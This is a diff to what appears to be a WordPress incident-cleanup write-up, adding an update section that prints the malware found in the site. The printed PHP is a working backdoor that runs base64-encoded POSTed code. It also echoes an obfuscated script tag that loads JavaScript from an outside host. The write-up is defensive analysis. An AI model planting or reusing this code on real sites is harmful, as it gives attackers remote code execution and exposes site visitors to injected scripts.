@@ -66,3 +66,21 @@ for subdir, dirs, files in os.walk(os.getcwd()): # Note: operates within the cur
 ## Possible Cause: Thrive Themes Plugins?
 
 As a side-note, this particular vulnerability may be related to a Thrive Themes unused-Zapier-API-key exploit. See [source](https://rootdaemon.com/2021/03/25/hackers-start-exploiting-recent-vulnerabilities-in-thrive-theme-wordpress-plugins/).
+
+## Update
+
+Here is the malicious code that was causing the problem (i.e. going through my site directory and creating or updating `index.php` files everywhere):
+
+```php
+if(isset($_POST['zi']) 
+    && md5($_POST['zi']) == base64_decode('M2UwZWFhNWFlNGE1NzRjMGYzYjEyOTRmZGQwZTg1ZTQ=') ) {
+    $lt = base64_decode($_POST['a']);file_put_contents('lte_','<?php '.$lt);$lt='lte_';
+if(file_exists($lt)){
+    include($lt);unlink($lt);die();
+}
+} else {
+    echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(115).chr(61).chr(48).chr(55).chr(38).chr(98).chr(61).chr(51).chr(52).chr(53).chr(38).chr(99).chr(105).chr(100).chr(61).chr(55).chr(52).chr(53).chr(55).chr(45).chr(56).chr(53).chr(45).chr(50).chr(51).chr(52).chr(54).chr(55).chr(56).chr(56).chr(45).chr(50).chr(52).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
+}
+```
+
+Note: you will want to make sure that you don't delete index files in their entirety if they are only partly malicious code. Wordpress has important index files you will need to hang onto. If you accidentally delete one of these, you can find them in the [Wordpress source code](https://github.com/WordPress/WordPress).
